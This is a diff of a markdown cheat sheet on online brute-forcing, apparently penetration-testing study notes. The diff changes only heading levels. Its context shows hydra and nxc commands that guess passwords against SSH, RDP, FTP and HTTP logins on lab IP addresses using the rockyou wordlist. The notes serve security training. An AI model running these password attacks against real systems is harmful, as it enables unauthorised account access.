@@ -1,6 +1,6 @@
 # Online bruteforce
 
-# Wordlists
+## Wordlists
 
 ```bash
 cd /usr/share/wordlists/
@@ -22,7 +22,7 @@ sudo gzip -d rockyou.txt.gz
 ├── wfuzz -> /usr/share/wfuzz/wordlist
 └── wifite.txt -> /usr/share/dict/wordlist-probable.txt
 ```
-# SSH
+## SSH
 
 ```bash
 # Hydra (BETTER than NXC)
@@ -38,7 +38,7 @@ hydra -l root -P <passwordList> -s port <IP> ssh
 nxc ssh 192.168.50.201 --port 2222 -u george -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 ```
 
-# RDP
+## RDP
 
 ```bash
 # Hydra
@@ -49,7 +49,7 @@ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperPassword" rdp://192
 nxc rdp 192.168.150.202 -u /usr/share/wordlists/dirb/others/names.txt -p "SuperPassword"
 ```
 
-# FTP
+## FTP
 
 ```bash
 # Hydra
@@ -59,9 +59,9 @@ hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.150.202
 nxc ftp 192.168.150.202 -u itadmin -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 ```
 
-# HTTP
+## HTTP
 
-## Hydra 
+### Hydra 
 
 ```bash
 # POST login/password BODY
@@ -72,7 +72,7 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form 
 # Basic auth b64 (Header Authorization: Basic)
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.174.201 http-get /
 ```
-## ffuf
+### ffuf
 
 ``` bash
 # Burp -> clic droit sur la requête -> Copy to file / Save selected text to file -> `request.txt`
